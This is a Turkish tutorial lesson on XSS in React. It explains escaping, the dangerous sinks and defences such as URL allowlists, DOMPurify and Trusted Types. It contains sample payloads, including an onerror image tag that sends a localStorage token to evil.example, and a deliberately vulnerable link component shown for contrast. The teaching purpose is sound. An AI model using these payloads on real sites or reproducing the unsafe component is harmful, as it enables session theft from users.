---
title: "XSS ve React’in güvenli çıkış noktaları"
minutes: 16
kind: concept
---

# XSS ve React’in güvenli çıkış noktaları

:::pain[Yorum alanından çalışan zararlı kod]
Film detay sayfasına eklenen bir kullanıcı incelemesi ekranda listelendiğinde, sayfayı açan herkesin tarayıcısında aniden bir uyarı penceresi beliriyor ve arka planda kullanıcının yerel depodaki oturum anahtarları bilinmeyen bir sunucuya postalanıyor. İnceleme metninde `<img src=x onerror=...>` kodu gizlenmiştir; bileşen bu metni güvenilmeyen bir çıkış noktasına ham HTML olarak bastığı için tarayıcı kodu çalıştırmıştır.
:::

## XSS nedir ve nasıl çalışır?

XSS (Cross-Site Scripting ya da Siteler Arası Betik Çalıştırma), saldırganın bir web sayfasına kötü amaçlı JavaScript kodu enjekte etmesi ve bu kodun sayfayı ziyaret eden diğer kullanıcıların tarayıcısında çalıştırılmasıdır.

JavaScript tarayıcıda kullanıcının oturum açtığı etki alanının tüm yetkilerine sahiptir:
- `localStorage`, `sessionStorage` ve `document.cookie` (eğer `HttpOnly` değilse) verilerini okuyabilir.
- Kullanıcının adına oturum açılmış gibi API istekleri fırlatabilir.
- Sayfadaki form alanlarını dinleyerek parola ve kredi kartı bilgilerini saldırgana gönderebilir.
- DOM içeriğini manipüle ederek sahte giriş pencereleri gösterebilir.

XSS saldırıları kaynağına göre üç ana sınıfa ayrılır:

1. **Stored (Kalıcı) XSS:** En tehlikeli türdür. Saldırgan zararlı kodu veritabanına kaydeder (örneğin film yorumu, kullanıcı profili adı, biyografi). Bu içeriği görüntüleyen her kullanıcı enfekte olur.
2. **Reflected (Yansıyan) XSS:** Zararlı kod doğrudan bir bağlantının (URL parametresi veya arama kutusu) içine yerleştirilir. Kullanıcı özel hazırlanmış bağlantıya tıkladığında sunucu bu parametreyi sayfaya yansıtır.
3. **DOM-based XSS:** Zafiyet sunucudan değil, tamamen istemci tarafındaki JavaScript kodunun güvenilmeyen bir girdiyi (örneğin `location.hash` veya `location.search`) doğrudan tehlikeli bir DOM çıkış noktasına (sink) yazmasından kaynaklanır.

## React’in koruma kalkanı: JSX kaçışlaması

React, tasarım gereği XSS saldırılarına karşı güçlü bir varsayılan kalkan sunar. JSX içine süslü parantezle yerleştirdiğin her metin değeri (`<p>{comment}</p>`), tarayıcıya HTML olarak değil **metin düğümü (text node)** olarak aktarılır.

```tsx
// Kullanıcı girdisi: "<script>alert('xss')</script>"
const userText = "<script>alert('xss')</script>"

// React bunu DOM'a şöyle yazar:
// p.textContent = userText
return <p>{userText}</p>
```

React, `textContent` veya benzeri güvenli DOM API'lerini kullanarak `<`, `>`, `&`, `"`, `'` gibi özel karakterleri otomatik olarak kaçışlar (escape). Bu sayede kullanıcı ne kadar karmaşık bir HTML veya JavaScript etiketi girerse girsin, tarayıcı bunu çalıştırılabilir bir kod olarak değil, ekranda okunacak düz bir yazı dizisi olarak ele alır.

![XSS akışı ve güvenli çıkış noktaları](diagram:xss-akisi)

Yukarıdaki akış şeması savunma mekanizmasını özetler: Güvenilmeyen bir girdi React'in metin akışından geçtiğinde zararsız hale gelir. Ancak tehlikeli bir çıkış noktasına (sink) ulaştığında koruma kalkar; burada devreye izin listeleri, arındırma (sanitize) kütüphaneleri ve son savunma hattı olan CSP girmelidir.

## React’in korumadığı tehlikeli çıkış noktaları (Sinks)

React'in kaçışlama mekanizması her yeri korumaz. Bir geliştiricinin bilinçli olarak ya da farkında olmadan React'in güvenli sınırlarının dışına çıkabildiği dört kritik nokta vardır:

### 1. `dangerouslySetInnerHTML`

React, ham HTML basmanın tehlikesini vurgulamak için bu özelliğe açıkça `dangerously` (tehlikeli biçimde) önekini vermiştir:

```tsx
// TEHLİKELİ: Ham HTML doğrudan DOM'a basılır
<div dangerouslySetInnerHTML={{ __html: userProvidedHtml }} />
```

Eğer `userProvidedHtml` içinde `<img src=x onerror="fetch('https://evil.example?k=' + localStorage.getItem('token'))">` varsa, tarayıcı görsel yüklenemediği anda `onerror` olayını tetikler ve saldırganın kodu kurbanın oturumu altında çalışır.

### 2. URL öznitelikleri (`href` ve `src`)

React, JSX içindeki metinleri kaçışlar ancak `<a href={url}>` içindeki URL protokolünün güvenli olup olmadığını denetlemez.

Tarayıcılar `javascript:` şemasına sahip URL'leri destekler. Kullanıcı bir bağlantıya tıkladığında tarayıcı harici bir sayfaya gitmek yerine iki nokta üst üste sonrasındaki JavaScript kodunu o sayfanın bağlamında çalıştırır:

```tsx
// TEHLİKELİ: userUrl "javascript:alert(document.domain)" olabilir!
<a href={userUrl}>Kullanıcı Web Sitesi</a>
```

Aynı tehlike `data:text/html,...` veya eski `vbscript:` protokolleri için de geçerlidir.

### 3. Doğrudan DOM manipülasyonu (`ref` ve `innerHTML`)

React'in sanal DOM (Virtual DOM) ağacını atlayıp `useRef` veya doğrudan DOM API'leri ile elemana müdahale edildiğinde React hiçbir koruma sağlayamaz:

```tsx
// TEHLİKELİ: React'in korumasını tamamen baypas eder
const containerRef = useRef<HTMLDivElement>(null)
useEffect(() => {
  if (containerRef.current) {
    containerRef.current.innerHTML = unvalidatedData
  }
}, [unvalidatedData])
```

### 4. `eval()`, `new Function()` ve üçüncü parti widget'lar

Dinamik kod çalıştıran JavaScript fonksiyonları ya da sayfaya denetimsiz eklenen harici reklam/anket script'leri sayfadaki tüm verilere erişebilir.

## Adım adım değerlendirme matrisi

| Girdi İçeriği | Çıkış Noktası (Sink) | Tarayıcının Yorumu | Sonuç |
| --- | --- | --- | --- |
| `<img src=x onerror=alert(1)>` | `<p>{girdi}</p>` | Düz metin (`textContent`) | **Güvenli:** Ekranda `<img src=x...>` yazısı görünür, kod çalışmaz |
| `<img src=x onerror=alert(1)>` | `dangerouslySetInnerHTML={{ __html: girdi }}` | HTML öğesi ve olay tetikleyici | **XSS Zafiyeti:** Betik anında çalışır |
| `javascript:steal()` | `<a href={girdi}>Link</a>` | Yürütülebilir URL şeması | **XSS Zafiyeti:** Tıklanınca betik çalışır |
| `https://themoviedb.org` | `<a href={girdi}>Link</a>` | Güvenli web protokolü | **Güvenli:** Dış siteye yönlenir |
| `<script>bad()</script>` | `element.innerHTML = girdi` | HTML ayrıştırma | **XSS Zafiyeti:** Betik DOM'a işlenir |

## Savunma stratejisi: Çok katmanlı güvenlik

Bir React uygulamasında XSS'e karşı tam koruma sağlamak için tek bir önlem yetmez; savunma derinliği (defense-in-depth) prensibi uygulanır:

### 1. Kural: Metinleri doğal JSX ile render et

Zengin metin formatlaması (HTML) zorunlu olmadıkça kullanıcıdan gelen tüm verileri doğrudan JSX değişkeni olarak (`<span>{text}</span>`) ekrana bas.

### 2. Kural: URL protokollerini izin listesiyle (whitelist) sınırla

Harici bağlantılar veya görseller için kullanıcıdan URL kabul ediyorsan, URL'yi `new URL()` ile ayrıştır ve protokolün güvenli bir izin listesinde (`https:`, `http:`, gerekirse `mailto:`) olduğunu doğrula:

```ts check title="src/shared/lib/validateUrl.ts"
export function sanitizeWebUrl(rawUrl: string, fallbackUrl = '#'): string {
  const trimmed = rawUrl.trim()
  if (!trimmed) return fallbackUrl

  try {
    const parsed = new URL(trimmed)
    const allowedProtocols = ['https:', 'http:', 'mailto:']
    if (allowedProtocols.includes(parsed.protocol.toLowerCase())) {
      return trimmed
    }
    return fallbackUrl
  } catch {
    // Göreli yollar veya geçersiz dizgiler new URL() tarafından reddedilir
    return fallbackUrl
  }
}
```

### 3. Kural: Zengin metin gerekiyorsa mutlaka sanitize et

Markdown ya da zengin metin editörü (WYSIWYG) gibi HTML göstermenin mecburi olduğu senaryolarda ham girdi asla doğrudan basılmaz. Bir arındırma (sanitization) kütüphanesi (sektör standardı: `DOMPurify`) kullanılır:

```tsx
// Kavramsal örnek: DOMPurify zararlı etiket ve öznitelikleri ayıklar
import DOMPurify from 'dompurify'

function RichDescription({ rawHtml }: { rawHtml: string }) {
  const cleanHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'ul', 'li'],
    ALLOWED_ATTR: [],
  })

  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
}
```

*Not: Bu eğitim platformunun çekirdek paketlerinde `dompurify` kurulu değildir; kavramsal olarak mantığını bilmen ve projelerinde bu deseni uygulaman gerekir.*

### 4. Kural: React 19 ve Trusted Types

React 19, modern tarayıcıların **Trusted Types** (Güvenilir Tipler) standardını yerel olarak destekler. Katı bir CSP kuralı (`require-trusted-types-for 'script'`) uygulandığında, tarayıcı `innerHTML` veya `dangerouslySetInnerHTML` içine düz bir `string` verilmesini reddeder; yalnızca güvenli bir politika tarafından onaylanmış `TrustedHTML` nesnelerini kabul eder. Bu sayede dikkatsiz bir geliştiricinin arındırılmamış ham metin girmesi tarayıcı seviyesinde engellenir.

## Önce kırık, sonra doğru: Profil bağlantı bileşeni

Şimdi harici kullanıcı web sitesi bağlantılarını gösteren bir bileşeni önce zafiyetli, ardından güvenli biçimde kurgulayalım.

Kırık hali:

```tsx title="src/features/profile/UnsafeProfileLink.tsx"
// KIRIK: javascript: şeması kontrol edilmiyor!
export function UnsafeProfileLink({ siteUrl }: { siteUrl: string }) {
  return (
    <div className="profile-link">
      {/* Saldırgan siteUrl olarak "javascript:alert(1)" verirse tıklandığında kod çalışır */}
      <a href={siteUrl}>Kullanıcı Sayfası</a>
    </div>
  )
}
```

Güvenli hali:

```tsx check title="src/features/profile/SafeProfileLink.tsx"
export interface SafeProfileLinkProps {
  siteUrl: string
  label?: string
}

function verifyHttpUrl(candidate: string): string | null {
  try {
    const parsed = new URL(candidate.trim())
    if (parsed.protocol === 'https:' || parsed.protocol === 'http:') {
      return parsed.href
    }
    return null
  } catch {
    return null
  }
}

export function SafeProfileLink({ siteUrl, label = 'Web Sitesi' }: SafeProfileLinkProps) {
  const verifiedUrl = verifyHttpUrl(siteUrl)

  if (!verifiedUrl) {
    return <span className="text-muted">Geçersiz bağlantı</span>
  }

  return (
    <a
      href={verifiedUrl}
      target="_blank"
      rel="noreferrer noopener"
      className="text-primary hover:underline"
    >
      {label}
    </a>
  )
}
```

## Sık hatalar ve düzeltmeleri

:::mistake[dangerouslySetInnerHTML'i metin kırmak veya stil vermek için kullanmak]
**Belirti:** Kullanıcı yorumlarındaki yeni satırları (`\n`) `<br />` etiketine çevirmek için `dangerouslySetInnerHTML` kullanılıyor ve sitede XSS zafiyeti açılıyor.  
**Neden:** Yalnızca satır sonu eklemek için ham HTML moduna geçmek, tüm metindeki HTML etiketlerini tarayıcıya açar.  
**Düzeltme:** CSS `whitespace-pre-line` kuralını kullan veya metni `\n` ile bölüp React `<br />` elemanlarıyla birleştir.
:::

:::mistake[Kendi regex fonksiyonunla HTML temizlemeye çalışmak]
**Belirti:** `content.replace(/<script>/gi, '')` yazıldığı halde `<ScRiPt>` veya `<img src=x onerror=...>` kodları çalışmaya devam ediyor.  
**Neden:** HTML dilbilgisi düzenli ifadelerle (regex) güvenli biçimde ayrıştırılamaz. İç içe etiketler, bozuk sözdizimleri ve olay işleyicileri regex filtrelerini kolayca atlatır.  
**Düzeltme:** Asla kendi regex temizleyicini yazma; ya React'in doğal metin çıktısına güven ya da `DOMPurify` gibi test edilmiş bir kütüphane kullan.
:::

:::mistake[Bağlantılarda rel="noreferrer noopener" özniteliğini unutmak]
**Belirti:** `target="_blank"` ile açılan harici web sitesi, `window.opener.location` üzerinden kullanıcının ana sekmesini başka bir sahte adrese yönlendirebiliyor (reverse tabnabbing).  
**Neden:** `target="_blank"` açılan yeni sayfaya ana sayfanın pencere nesnesine erişim hakkı tanır.  
**Düzeltme:** Tüm harici `target="_blank"` bağlantılarına mutlaka `rel="noreferrer noopener"` ekle.
:::

:::sector[Sektör standardı]
Kurumsal React takımlarında ESLint kural setine `@typescript-eslint/no-explicit-any` yanında `react/no-danger` kuralı zorunlu olarak eklenir. `dangerouslySetInnerHTML` kullanımı CI hattında hata verir; yalnızca güvenlik ekibinin incelediği ve istisna tanımladığı özel bileşenlerde izin verilir. Ayrıca oturum token'ları XSS riskini azaltmak için `localStorage` yerine bir sonraki derste göreceğimiz `HttpOnly` çerezlerde tutulur.
:::

## Özet

- XSS, saldırganın zararlı JavaScript kodunu kurbanın tarayıcısında o sitenin yetkileriyle çalıştırmasıdır.
- React, JSX içindeki süslü parantez değişkenlerini otomatik olarak metin (`textContent`) olarak kaçışlayarak güçlü bir varsayılan koruma sağlar.
- `dangerouslySetInnerHTML`, `<a href={url}>` içindeki `javascript:` şemaları ve doğrudan DOM manipülasyonları (`innerHTML`) React'in korumadığı tehlikeli çıkış noktalarıdır (sinks).
- Harici URL'ler mutlaka `https:`, `http:` ve `mailto:` protokol izin listeleriyle denetlenmeli; zengin metin gerektiğinde `DOMPurify` gibi kütüphanelerle arındırılmalıdır.
- React 19 Trusted Types desteği ve CSP politikaları XSS'e karşı savunma derinliği sağlayan tamamlayıcı katmanlardır.

### Kendini yokla

1. Bir React bileşeninde `<p>{'<script>alert(1)</script>'}</p>` yazıldığında ekranda ne görünür ve script çalışır mı?
*Cevap:* Ekranda düz yazı olarak `<script>alert(1)</script>` görünür; script kesinlikle çalışmaz çünkü React bu değeri HTML olarak değil metin düğümü olarak DOM'a ekler.

2. Bir kullanıcı profilinde web sitesi olarak `"javascript:alert(document.cookie)"` girdi. Bu değer doğrudan `<a href={site}>Web sitesi</a>` içine verilirse ne olur?
*Cevap:* Kullanıcı linke tıkladığında tarayıcı harici bir sayfaya gitmez; `javascript:` şeması nedeniyle tırnak içindeki kodu çalıştırır ve XSS açığı tetiklenir. URL protokolü mutlaka denetlenmelidir.
